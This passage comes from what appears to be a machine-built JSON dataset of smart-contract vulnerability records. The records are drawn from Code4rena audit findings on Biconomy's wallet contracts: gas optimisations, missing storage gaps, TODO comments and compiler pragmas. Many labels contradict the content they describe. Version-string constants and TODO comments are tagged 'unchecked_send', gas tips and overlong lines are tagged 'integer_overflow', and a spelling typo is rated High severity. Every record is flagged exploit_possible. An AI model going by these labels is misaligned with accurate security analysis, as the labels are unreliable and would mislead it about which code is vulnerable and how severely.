    "code": "\n2023-01-biconomy-main/contracts/smart-contract-wallet/BaseSmartAccount.sol::108 => (bool success,) = payable(msg.sender).call{value : missingAccountFunds, gas : type(uint256).max}(\"\");\n2023-01-biconomy-main/contracts/smart-contract-wallet/SmartAccount.sol::197 => ) public payable virtual override returns (bool success) {\n2023-01-biconomy-main/contracts/smart-contract-wallet/SmartAccount.sol::261 => (bool success,) = receiver.call{value: payment}(\"\");\n2023-01-biconomy-main/contracts/smart-contract-wallet/SmartAccount.sol::285 => (bool success,) = receiver.call{value: payment}(\"\");\n2023-01-biconomy-main/contracts/smart-contract-wallet/SmartAccount.sol::451 => (bool success,) = dest.call{value:amount}(\"\");\n2023-01-biconomy-main/contracts/smart-contract-wallet/SmartAccount.sol::527 => (bool req,) = address(entryPoint()).call{value : msg.value}(\"\");\n2023-01-biconomy-main/contracts/smart-contract-wallet/SmartAccountNoAuth.sol::261 => (bool success,) = receiver.call{value: payment}(\"\");\n2023-01-biconomy-main/contracts/smart-contract-wallet/SmartAccountNoAuth.sol::284 => (bool success,) = receiver.call{value: payment}(\"\");\n2023-01-biconomy-main/contracts/smart-contract-wallet/SmartAccountNoAuth.sol::441 => (bool success,) = dest.call{value:amount}(\"\");\n2023-01-biconomy-main/contracts/smart-contract-wallet/SmartAccountNoAuth.sol::517 => (bool req,) = address(entryPoint()).call{value : msg.value}(\"\");\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Medium",
    "title": "Findings:",
    "description": "2023-01-biconomy-main/contracts/smart-contract-wallet/BaseSmartAccount.sol::108 => (bool success,) = payable(msg.sender).call{value : missingAccountFunds, gas : type(uint256).max}(\"\"); 2023-01-biconomy-main/contracts/smart-contract-wallet/SmartAccount.sol::197 => ) public payable virtual override returns (bool success) { 2023-01-biconomy-main/contracts/smart-contract-wallet/SmartAccount.sol::261 => (bool success,) = receiver.call{value: payment}(\"\"); 2023-01-biconomy-main/contracts/smart-contract-wallet/SmartAccount.sol::285 => (bool success,) = receiver.call{value: payment}(\"\"); 2023-01-biconomy-main/contracts/smart-contract-wallet/SmartAccount.sol::451 => (bool success,) = dest.call{value:amount}(\"\");",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 12,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 1.0,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "\n2023-01-biconomy-main/contracts/smart-contract-wallet/SmartAccountFactory.sol::15 => mapping (address => bool) public isAccountExist;\n",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "Medium",
    "title": "Findings:",
    "description": "2023-01-biconomy-main/contracts/smart-contract-wallet/SmartAccountFactory.sol::15 => mapping (address => bool) public isAccountExist;",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 3,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.135,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "\n2023-01-biconomy-main/contracts/smart-contract-wallet/SmartAccount.sol::36 => string public constant VERSION = \"1.0.2\"; // using AA 0.3.0\n2023-01-biconomy-main/contracts/smart-contract-wallet/SmartAccountFactory.sol::11 => string public constant VERSION = \"1.0.2\";\n2023-01-biconomy-main/contracts/smart-contract-wallet/SmartAccountNoAuth.sol::36 => string public constant VERSION = \"1.0.2\"; // aa 0.3.0 rebase\n2023-01-biconomy-main/contracts/smart-contract-wallet/handler/DefaultCallbackHandler.sol::12 => string public constant NAME = \"Default Callback Handler\";\n2023-01-biconomy-main/contracts/smart-contract-wallet/handler/DefaultCallbackHandler.sol::13 => string public constant VERSION = \"1.0.0\";\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Medium",
    "title": "Findings:",
    "description": "2023-01-biconomy-main/contracts/smart-contract-wallet/SmartAccount.sol::36 => string public constant VERSION = \"1.0.2\"; // using AA 0.3.0 2023-01-biconomy-main/contracts/smart-contract-wallet/SmartAccountFactory.sol::11 => string public constant VERSION = \"1.0.2\"; 2023-01-biconomy-main/contracts/smart-contract-wallet/SmartAccountNoAuth.sol::36 => string public constant VERSION = \"1.0.2\"; // aa 0.3.0 rebase 2023-01-biconomy-main/contracts/smart-contract-wallet/handler/DefaultCallbackHandler.sol::12 => string public constant NAME = \"Default Callback Handler\"; 2023-01-biconomy-main/contracts/smart-contract-wallet/handler/DefaultCallbackHandler.sol::13 => string public constant VERSION = \"1.0.0\";",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 7,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.703,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "\n2023-01-biconomy-main/contracts/smart-contract-wallet/Proxy.sol::16 => assert(_IMPLEMENTATION_SLOT == bytes32(uint256(keccak256(\"biconomy.scw.proxy.implementation\")) - 1));\n2023-01-biconomy-main/contracts/smart-contract-wallet/common/Singleton.sol::13 => assert(_IMPLEMENTATION_SLOT == bytes32(uint256(keccak256(\"biconomy.scw.proxy.implementation\")) - 1));\n",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "Medium",
    "title": "Findings:",
    "description": "2023-01-biconomy-main/contracts/smart-contract-wallet/Proxy.sol::16 => assert(_IMPLEMENTATION_SLOT == bytes32(uint256(keccak256(\"biconomy.scw.proxy.implementation\")) - 1)); 2023-01-biconomy-main/contracts/smart-contract-wallet/common/Singleton.sol::13 => assert(_IMPLEMENTATION_SLOT == bytes32(uint256(keccak256(\"biconomy.scw.proxy.implementation\")) - 1));",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 4,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.358,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "\n2023-01-biconomy-main/contracts/smart-contract-wallet/SmartAccount.sol::550 => receive() external payable {}\n2023-01-biconomy-main/contracts/smart-contract-wallet/SmartAccountNoAuth.sol::540 => receive() external payable {}\n",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "Medium",
    "title": "Findings:",
    "description": "2023-01-biconomy-main/contracts/smart-contract-wallet/SmartAccount.sol::550 => receive() external payable {} 2023-01-biconomy-main/contracts/smart-contract-wallet/SmartAccountNoAuth.sol::540 => receive() external payable {}",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 4,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.225,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "\n2023-01-biconomy-main/contracts/smart-contract-wallet/SmartAccount.sol::136 => return keccak256(abi.encode(DOMAIN_SEPARATOR_TYPEHASH, getChainId(), this));\n2023-01-biconomy-main/contracts/smart-contract-wallet/SmartAccount.sol::431 => abi.encode(\n2023-01-biconomy-main/contracts/smart-contract-wallet/SmartAccountNoAuth.sol::421 => abi.encode(\n",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "Medium",
    "title": "Findings:",
    "description": "2023-01-biconomy-main/contracts/smart-contract-wallet/SmartAccount.sol::136 => return keccak256(abi.encode(DOMAIN_SEPARATOR_TYPEHASH, getChainId(), this)); 2023-01-biconomy-main/contracts/smart-contract-wallet/SmartAccount.sol::431 => abi.encode( 2023-01-biconomy-main/contracts/smart-contract-wallet/SmartAccountNoAuth.sol::421 => abi.encode(",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 5,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.345,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "SmartAccount._validateSignature",
    "vulnerability_label": 1,
    "vulnerability_type": "integer_overflow",
    "severity": "Low",
    "title": "## Gas Optimizations",
    "description": "|       | Issue                                                                | Instances | | ----- |:-------------------------------------------------------------------- |:---------:| | GAS-1 | Applying `unchecked` operations where no overflow/underflow possible |    13     | | GAS-2 | Gas optimizatin for `SmartAccount.execTransaction`                   |     1     | | GAS-3 | Gas optimizatin for `SmartAccount.requiredTxGas`                     |     2     |",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 1,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.031,
    "vulnerability_types": [
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\nFile: https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/aa-4337/core/EntryPoint.sol\n\n74:         for (uint256 i = 0; i < opslen; i++) {\n\n80:         for (uint256 i = 0; i < opslen; i++) {\n\n100:         for (uint256 i = 0; i < opasLen; i++) {\n\n107:         for (uint256 a = 0; a < opasLen; a++) {\n\n112:             for (uint256 i = 0; i < opslen; i++) {\n\n128:         for (uint256 a = 0; a < opasLen; a++) {\n\n134:             for (uint256 i = 0; i < opslen; i++) {\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "integer_overflow",
    "severity": "Low",
    "title": "Applying `unchecked` operations on the index increment in for-loops: *Instances (7)*",
    "description": "In addtion to the for-loop gas optimization in the C4audit output, a further gas optimization can be achieved to save another 63/120 gas per loop. For stack variables like `uint256 index`, each `unchecked{++index;}` saves some gas compared with `++index;`. The saved gas amount varies under different situations - 120  without compiler optimization, and 63 with compiler optimization (200 runs). The `index` of a for-loop won't overflow so it is safe to apply unchecked increment. A typical optimized for-loop looks like: ... uint256 length = someArray.length; for (uint256 index; index<length;){",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 18,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.527,
    "vulnerability_types": [
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "File: https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol\n\n//@audit Won't overflow: `gasleft()` is the amount of gas available for execution, `msg.data.length` is the calldata length\n200:    uint256 startGas = gasleft() + 21000 + msg.data.length * 8;\n\n//@audit Each Nonce incremented from zero, won't overflow\n216:    nonces[batchId]++;\n",
    "vulnerability_label": 1,
    "vulnerability_type": "integer_overflow",
    "severity": "Low",
    "title": "Applying `unchecked` operations where no overflow/underflow: *Instances (6)*",
    "description": "[Link to code](https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/aa-4337/core/EntryPoint.sol) File: https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/aa-4337/core/EntryPoint.sol //@audit Refer to L106 (opIndex = 0); `opIndex` increments in a limited for-loop 114:                 opIndex++; //@audit Refer to L127",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 8,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.405,
    "vulnerability_types": [
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "\n\nfunction getHash(UserOperation calldata userOp)\n    public pure returns (bytes32) {\n        //can't use userOp.hash(), since it contains also the paymasterAndData itself.\n        return keccak256(abi.encode(\n                userOp.sender,\n                userOp.nonce,\n                keccak256(userOp.initCode),\n                keccak256(userOp.callData),\n                userOp.callGasLimit,\n                userOp.verificationGasLimit,\n                userOp.preVerificationGas,\n                userOp.maxFeePerGas,\n                userOp.maxPriorityFeePerGas\n            ));\n    }\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "integer_overflow",
    "severity": "Low",
    "title": "G1. https://github.com/code-423n4/2023-01-biconomy/blob/53c8c3823175aeb26dee5529eeefa81240a406ba/scw-contracts/contracts/smart-contract-wallet/paymasters/verifying/singleton/VerifyingSingletonPaymaster.sol#L58",
    "description": "Adding unchecked to save gas since overflow is not possible due to previous check. unchecked{ paymasterIdBalances[msg.sender] -= amount; } G2. https://github.com/code-423n4/2023-01-biconomy/blob/53c8c3823175aeb26dee5529eeefa81240a406ba/scw-contracts/contracts/smart-contract-wallet/aa-4337/core/StakeManager.sol#L118",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 19,
    "has_external_calls": true,
    "has_state_changes": false,
    "complexity_score": 0.588,
    "vulnerability_types": [
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": " [Line 49](https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/base/ModuleManager.sol#L49)\n- File: ",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "Medium",
    "title": "## 1. Splitting `require` statements that use `&&` saves gas",
    "description": "Instead of using the `&&` operator to check multiple conditions, use multiple `require()` statements. This will save approximately 3 gas per `&&`. Here is an example of this issue: File: `ModuleManager.sol` [Line 34](https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/base/ModuleManager.sol#L34) require(module != address(0) && module != SENTINEL_MODULES, \"BSA101\"); In the example above, the `&&` could be split up:",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 2,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.15,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": " [Line 117](https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/aa-4337/core/StakeManager.sol#L117)\n- File: ",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "Medium",
    "title": "2. Strict equalities cost less gas than non-strict",
    "description": "Strict equalities (`<`, `>`) cost less gas than non-strict (`<=`, `>=`). This is because strict equality uses fewer opcodes. For instance: File: `EntryPoint.sol` [Line 213](https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/aa-4337/core/EntryPoint.sol#L213) require(paymasterAndData.length >= 20, \"AA93 invalid paymasterAndData\"); The `require` statement above could use `>` instead of `>=` to save gas:",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 2,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.159,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "solidity\n        for (uint256 i = 0; i < opasLen;) {\n            totalOps += opsPerAggregator[i].userOps.length;\n            unchecked { i++; }\n        }\n",
    "vulnerability_label": 1,
    "vulnerability_type": "integer_overflow",
    "severity": "Low",
    "title": "6. Unchecked maths",
    "description": "Use the `unchecked` keyword to avoid unnecessary arithmetic checks and save gas when an underflow/overflow will not happen. For instance: File: `EntryPoint.sol` [Line 100-102](https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/aa-4337/core/EntryPoint.sol#L100-L102) for (uint256 i = 0; i < opasLen; i++) { totalOps += opsPerAggregator[i].userOps.length;",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 6,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.154,
    "vulnerability_types": [
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": " [L24](https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/paymasters/BasePaymaster.sol#L24)\n1. ",
    "vulnerability_label": 1,
    "vulnerability_type": "access_control",
    "severity": "Low",
    "title": "[L-1]: Critical changes should use two-step procedure",
    "description": "**Context:** 1. ```function setOwner(address _newOwner) external mixedAuth {``` [L109](https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol#L109) 1. ```function updateImplementation(address _implementation) external mixedAuth {``` [L120](https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol#L120) 1. ```function setEntryPoint(IEntryPoint _entryPoint) public onlyOwner {``` [L24](https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/paymasters/BasePaymaster.sol#L24) 1. ```function setSigner( address _newVerifyingSigner) external onlyOwner{``` [L65](https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/paymasters/verifying/singleton/VerifyingSingletonPaymaster.sol#L65)",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 2,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.147,
    "vulnerability_types": [
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "function _validatePaymasterPrepayment(uint256 opIndex, UserOperation calldata op, UserOpInfo memory opInfo, uint256 requiredPreFund, uint256 gasUsedByValidateAccountPrepayment) internal returns (bytes memory context, uint256 deadline) {",
    "vulnerability_label": 1,
    "vulnerability_type": "integer_overflow",
    "severity": "Medium",
    "title": "[N-8]: Line is too long",
    "description": "**Context:** 1. ```function validateUserOp(UserOperation calldata userOp, bytes32 userOpHash, address aggregator, uint256 missingAccountFunds)``` [L24](https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/aa-4337/interfaces/IAccount.sol#L24) 1. ```* subclass should return a nonce value that is used both by _validateAndUpdateNonce, and by the external provider (to read the current nonce)``` [L39](https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/BaseSmartAccount.sol#L39) 1. ```* subclass should return a nonce value that is used both by _validateAndUpdateNonce, and by the external provider (to read the current nonce)``` [L45](https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/BaseSmartAccount.sol#L45) 1. ```* subclass doesn't need to override this method. Instead, it should override the specific internal validation methods.``` [L57](https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/BaseSmartAccount.sol#L57)",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 1,
    "has_external_calls": true,
    "has_state_changes": false,
    "complexity_score": 0.236,
    "vulnerability_types": [
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "supportsInterface(bytes4 interfaceId)",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Low",
    "title": "## L-1: Missing ERC777 in the `supportsInterface(bytes4 interfaceId)` function",
    "description": "- Description: The `supportsInterface(bytes4 interfaceId)` is missing a bool return for ERC777 which is supported. - Location: [DefaultCallbackHandler.sol#L55](https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/handler/DefaultCallbackHandler.sol#L55) - Count: 1",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 1,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.037,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "ReentrancyGuardUpgradeable",
    "vulnerability_label": 1,
    "vulnerability_type": "reentrancy",
    "severity": "Low",
    "title": "Proof of Concept",
    "description": "In the following context of the upgradeable contracts they are expected to use gaps for avoiding collision: - `UUPSUpgradeable` - `ReentrancyGuardUpgradeable` However, none of these contracts contain storage gap. The storage gap is essential for upgradeable contract because \"It allows us to freely add new state variables in the future without compromising the storage compatibility with existing deployments\". Refer to the bottom part of this article: https://docs.openzeppelin.com/contracts/4.x/upgradeable",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 1,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.026,
    "vulnerability_types": [
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "\ncontract SmartAccount is \n    Singleton,\n    BaseSmartAccount,\n    IERC165,\n    ModuleManager,\n    SignatureDecoder,\n    SecuredTokenTransfer,\n    ISignatureValidatorConstants,\n    FallbackManager,\n    Initializable,\n    ReentrancyGuardUpgradeable\n{\n",
    "vulnerability_label": 1,
    "vulnerability_type": "reentrancy",
    "severity": "Medium",
    "title": "Github Permalinks",
    "description": "https://github.com/code-423n4/2023-01-biconomy/blob/7b02ebfcebbf79e6df65ee30efa347cffd28ebcd/scw-contracts/contracts/smart-contract-wallet/aa-4337/samples/SimpleAccount.sol#L21 `contract SimpleAccount is BaseAccount, UUPSUpgradeable, Initializable {` https://github.com/code-423n4/2023-01-biconomy/blob/721e2afb493d8bc0bc9488b84eaf2deb14c8b43f/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol#L28 contract SmartAccount is Singleton,",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 14,
    "has_external_calls": true,
    "has_state_changes": false,
    "complexity_score": 0.251,
    "vulnerability_types": [
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "uint256[50] private __gap;",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "Low",
    "title": "Recommended Mitigation Steps",
    "description": "Recommend adding appropriate storage gap at the end of upgradeable contracts such as the below. Please reference OpenZeppelin upgradeable contract templates. `uint256[50] private __gap;`",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 1,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.026,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "javascript\n228:            // We only substract 2500 (compared to the 3000 before) to ensure that the amount passed is still higher than targetTxGas\n",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "High",
    "title": "substract",
    "description": "_subtract_ https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol#L228 228:            // We only substract 2500 (compared to the 3000 before) to ensure that the amount passed is still higher than targetTxGas",
    "confidence": 0.9,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 3,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.149,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": true,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "solidity\nFile: contracts/smart-contract-wallet/aa-4337/core/StakeManager.sol\n\n106:    (bool success,) = withdrawAddress.call{value : stake}(\"\");\n120:    (bool success,) = withdrawAddress.call{value : withdrawAmount}(\"\");\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Low",
    "title": "[L-1] Missing checks for `address(0)` in withdraw methods",
    "description": "Consider checking for `address(0)` to prevent any loss of funds. _Instances 7_: File: contracts/smart-contract-wallet/SmartAccount.sol 537:    entryPoint().withdrawTo(withdrawAddress, amount); [Link to code](https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol)",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 7,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.222,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\nFile: contracts/smart-contract-wallet/SmartAccount.sol\n\n44:     // review? if rename wallet to account is must\n\n58:     // review\n\n68:     // nice to have\n69:     // event SmartAccountInitialized(IEntryPoint indexed entryPoint, address indexed owner);\n\n149:    //@review getNonce specific to EntryPoint requirements\n\n313:    //review\n\n487:    //@review\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Low",
    "title": "[L-2] Unresolved `TODO` and `review` comments",
    "description": "Open `TODO` and `review` comments indicate code that has to be addressed before production deployment. _Instances 12_: File: contracts/smart-contract-wallet/aa-4337/core/EntryPoint.sol 255:    // TODO: copy logic of gasPrice? [Link to code](https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/aa-4337/core/EntryPoint.sol)",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 17,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.363,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "\n\n[Link to code](https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/aa-4337/interfaces/IAggregatedAccount.sol)\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Low",
    "title": "[L-3] Unspecific compiler version pragma",
    "description": "For many files the compiler version pragma is the unspecific `^0.8.12`. Consider pinning a concrete compiler version to prevent a known vulnerable version to be accidentally selected. _Instances 11_: File: contracts/smart-contract-wallet/paymasters/BasePaymaster.sol 2:      pragma solidity ^0.8.12; [Link to code](https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/paymasters/BasePaymaster.sol)",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 5,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.164,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\nFile: contracts/smart-contract-wallet/SmartAccountFactory.sol\n\n53:     function deployWallet(address _owner, address _entryPoint, address _handler) public returns(address proxy){\n54:         bytes memory deploymentData = abi.encodePacked(type(Proxy).creationCode, uint(uint160(_defaultImpl)));\n55:         // solhint-disable-next-line no-inline-assembly\n56:         assembly {\n57:             proxy := create(0x0, add(0x20, deploymentData), mload(deploymentData))\n58:         }\n59:         BaseSmartAccount(proxy).init(_owner, _entryPoint, _handler);\n60:         isAccountExist[proxy] = true;\n61:     }\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "Low",
    "title": "[L-4] Missing event emit on `deployWallet`",
    "description": "The `deployWallet` method is not emiting an event when an account is created, as `deployCounterFactualWallet` does. Accounts created with `deployWallet` will be missing on logs, deriving in inconsistent behavior on off-chain tools. Consider emiting an event on `deployWallet`. _Instances 1_: File: contracts/smart-contract-wallet/SmartAccountFactory.sol 53:     function deployWallet(address _owner, address _entryPoint, address _handler) public returns(address proxy){ 54:         bytes memory deploymentData = abi.encodePacked(type(Proxy).creationCode, uint(uint160(_defaultImpl)));",
    "confidence": 0.7,
